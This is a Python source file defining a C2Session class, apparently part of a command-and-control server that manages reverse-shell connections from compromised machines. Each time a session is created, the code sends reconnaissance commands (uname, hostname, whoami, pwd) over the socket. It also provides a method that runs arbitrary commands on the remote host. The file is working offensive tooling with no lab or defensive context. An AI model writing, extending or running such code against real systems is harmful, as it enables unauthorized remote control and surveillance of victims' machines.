import socket

class C2Session:
    def __init__(self, session_id: str, socket: socket.socket, session_type: str) -> None:
        self.session_id: int = None
        self.socket: socket.socket = None
        self.session_type: str = None
        self.os: str = None
        self.hostname: str = None
        self.address: str = None
        self.user: str = None
        self.pwd: str = None

        self.set_session_id(session_id)
        self.set_socket(socket)
        self.set_type(session_type)

        self.get_system_info()

    def close(self) -> None:
        self.socket.close()

    def set_session_id(self, session_id: int) -> None:
        self.session_id = session_id

    def get_session_id(self) -> int:
        return self.session_id

    def set_socket(self, socket: socket.socket) -> None:
        self.socket = socket

    def get_socket(self) -> socket.socket:
        return self.socket

    def set_type(self, session_type: str) -> None:
        self.session_type = session_type

    def get_type(self) -> str:
        return self.session_type

    def set_os(self, os: str) -> None:
        self.os = os

    def get_os(self) -> str:
        return self.os

    def set_hostname(self, hostname: str) -> None:
        self.hostname = hostname

    def get_hostname(self) -> str:
        return self.hostname

    def set_address(self, address: str) -> None:
        self.address = address

    def get_address(self) -> str:
        return self.address

    def set_user(self, user: str) -> None:
        self.user = user

    def get_user(self) -> str:
        return self.user

    def set_pwd(self, pwd: str) -> None:
        self.pwd = pwd

    def get_pwd(self) -> str:
        return self.pwd

    def is_alive(self) -> bool:
        try:
            self.socket.sendall(b"")
            return True
        except:
            return False

    def get_system_info(self) -> None:
        try:
            self.set_os(self.exec_cmd("uname -s"))
            self.set_hostname(self.exec_cmd("hostname"))
            self.set_user(self.exec_cmd("whoami"))
            self.set_pwd(self.exec_cmd("pwd"))
        except:
            print("Error getting system info")

    def exec_cmd(self, cmd: str) -> str:
        try:
            command = f'{cmd}'
            self.get_socket().sendall(command.encode('utf-8') + b"\n")
            data = self.socket.recv(1024).decode()
            if data:
                return data.strip()
            else:
                return "unknown"
        except:
            return "unknown"

    def __str__(self) -> str:
        return f"     {self.get_session_id()} --> {self.get_address()[0]} - {self.get_user()}@{self.get_hostname()} - ({self.get_os()}/{self.get_type()}) - alive={self.is_alive()}"


if __name__ == "__main__":
    pass
